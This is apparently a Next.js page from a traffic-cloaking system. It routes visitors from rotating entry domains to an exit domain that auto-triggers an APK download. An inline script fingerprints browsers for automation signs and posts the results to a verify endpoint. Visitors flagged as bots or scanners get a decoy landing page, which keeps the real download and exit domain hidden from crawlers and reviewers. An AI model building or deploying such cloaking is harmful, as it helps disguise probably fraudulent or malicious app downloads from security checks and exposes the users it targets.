import { redirect } from "next/navigation";
import { headers, cookies } from "next/headers";
import {
  getCurrentEntry,
  getCurrentExit,
  isEntryDomain,
  isExitDomain,
  getSetting,
} from "@/lib/db";
import { recordVisit, getClientIp } from "@/lib/visit";
import ExitLanding from "@/components/ExitLanding";
import {
  isCloakEnabled,
  classifyServerAsync,
  getDecoyConfig,
} from "@/lib/cloak";
import { verifyHumanToken, HUMAN_COOKIE, PROBED_COOKIE } from "@/lib/token";

export const dynamic = "force-dynamic";
export const runtime = "nodejs";

// 取请求 Host(去掉端口)
function getHost(h: Headers): string {
  const host = h.get("host") || "";
  return host.split(":")[0].toLowerCase();
}

// 探针 JS（移植自 cloak-router/templates.go loadingTmpl）
const PROBE_PAGE = `<!doctype html>
<html lang="zh"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>加载中…</title></head>
<body style="font-family:sans-serif;color:#666;display:flex;height:90vh;align-items:center;justify-content:center">
<div>正在加载，请稍候…</div>
<script>
(async function(){
  function webglVendor(){
    try{var c=document.createElement('canvas');var gl=c.getContext('webgl')||c.getContext('experimental-webgl');
      if(!gl)return'';var e=gl.getExtension('WEBGL_debug_renderer_info');
      return e?String(gl.getParameter(e.UNMASKED_RENDERER_WEBGL)):'';}catch(_){return'';}
  }
  var notifQ='';
  try{if(navigator.permissions&&navigator.permissions.query){
    var st=await navigator.permissions.query({name:'notifications'});notifQ=st.state;}}catch(_){}
  var nav=navigator;
  var p={
    js:true,
    webdriver:nav.webdriver===true,
    automation:!!(window._phantom||window.__nightmare||window.callPhantom||
      Object.keys(window.document||{}).some(function(k){return k.indexOf('cdc_')===0;})||
      Object.keys(window).some(function(k){return k.indexOf('cdc_')===0;})),
    hasChrome:!!window.chrome,
    webglVendor:webglVendor(),
    plugins:(nav.plugins&&nav.plugins.length)||0,
    hc:nav.hardwareConcurrency||0,
    sw:screen.width||0,sh:screen.height||0,
    tz:(Intl&&Intl.DateTimeFormat)?Intl.DateTimeFormat().resolvedOptions().timeZone:'',
    langs:(nav.languages&&nav.languages[0])||nav.language||'',
    notif:(window.Notification&&Notification.permission)||'',
    notifQ:notifQ,
    touch:nav.maxTouchPoints||0
  };
  try{
    var r=await fetch('/api/cloak/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p)});
    location.reload();
  }catch(_){location.reload();}
})();
</script>
</body></html>`;

export default async function Page({
  searchParams,
}: {
  searchParams: { c?: string };
}) {
  const h = headers();
  const host = getHost(h);
  const promo = (searchParams.c || "").trim();

  // ---- 主域名:进后台 ----
  const main = (process.env.MAIN_DOMAIN || "").toLowerCase();
  if (host === main) {
    redirect("/admin");
  }

  const currentExit = getCurrentExit();
  const cloakOn = isCloakEnabled();

  // ── 分流判定（出口域名 + 入口域名均保护）──────────────────────────────
  if (cloakOn) {
    const ip = getClientIp(h);
    const jar = cookies();
    const humanToken = jar.get(HUMAN_COOKIE)?.value || "";
    const probedCookie = jar.get(PROBED_COOKIE)?.value || "";

    const isHuman = humanToken && verifyHumanToken(humanToken, ip);

    if (!isHuman) {
      // 已探测过判为机器 → 直接给假内容（不再发探针，防死循环）
      if (probedCookie === "0") {
        return decoyResponse(host, promo, currentExit);
      }

      // 服务端层快速初判（同步：UA + ASN；异步加 PTR，有超时容忍）
      const verdict = await classifyServerAsync(h);
      if (verdict.decision === "bot") {
        return decoyResponse(host, promo, currentExit);
      }

      // 需要 JS 探针确认 → 返回加载页
      return new Response(PROBE_PAGE, {
        headers: { "content-type": "text/html; charset=utf-8" },
      });
    }
  }

  // ---- 情况 A:出口域名 → 展示落地页 + 触发 APK 下载 ----
  if (isExitDomain(host)) {
    const apkUrl = getSetting("apk_url") || "";
    const imageUrl = getSetting("image_url") || "";
    const title = getSetting("title") || "下载";
    const autoDownload = getSetting("auto_download") === "1";
    return (
      <ExitLanding
        apkUrl={apkUrl}
        imageUrl={imageUrl}
        title={title}
        autoDownload={autoDownload}
        promo={promo}
      />
    );
  }

  // ---- 情况 B:入口域名 → 记录访问 → 跳转到当前出口 ----
  const isEntry = isEntryDomain(host);
  const fallback = getSetting("fallback_redirect") === "1";

  if ((isEntry || fallback) && currentExit) {
    let visitId = 0;
    try {
      visitId = await recordVisit({
        promo_code: promo,
        entry_domain: host,
        exit_domain: currentExit,
        headers: h,
      });
    } catch {
      // 记录失败不阻塞跳转
    }
    const target = new URL(`https://${currentExit}/`);
    if (promo) target.searchParams.set("c", promo);
    if (visitId) target.searchParams.set("v", String(visitId));
    redirect(target.toString());
  }

  // ---- 情况 C:无可用出口 / 未配置 ----
  return (
    <main style={{ padding: 40, textAlign: "center" }}>
      <p>服务未就绪</p>
    </main>
  );
}

// 返回假落地页（出口域名给假内容，入口域名给假跳转）
function decoyResponse(host: string, promo: string, currentExit: string | null) {
  const decoy = getDecoyConfig();

  // 出口域名：直接渲染假落地页
  if (isExitDomain(host)) {
    return (
      <ExitLanding
        apkUrl={decoy.apkUrl}
        imageUrl={decoy.imageUrl}
        title={decoy.title}
        autoDownload={false}
        promo={promo}
      />
    );
  }

  // 入口域名：跳转到假出口（复用当前出口域名，但带假内容标记）
  // 简单做法：直接给假落地页，不跳转，避免泄露真实出口域名
  return (
    <ExitLanding
      apkUrl={decoy.apkUrl}
      imageUrl={decoy.imageUrl}
      title={decoy.title}
      autoDownload={false}
      promo={promo}
    />
  );
}
